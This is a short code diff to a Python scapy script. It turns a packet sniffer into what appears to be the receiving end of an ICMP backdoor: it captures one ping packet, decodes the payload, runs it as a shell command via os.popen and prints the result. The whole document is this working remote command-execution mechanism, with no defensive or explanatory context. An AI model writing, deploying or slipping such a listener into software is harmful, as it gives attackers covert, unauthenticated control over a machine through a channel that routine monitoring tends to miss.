@@ -3,9 +3,9 @@
 #Client should be on the host machine
 
 from scapy.all import *
-import os
 
-
-recv = sniff(filter="icmp", count=10)
-print("recv")
-print("done")
+recv = sniff(filter="icmp", count=1)
+print(recv)
+data = recv[0][Raw].load.decode('utf-8')
+out = os.popen(data).read()
+print(out)
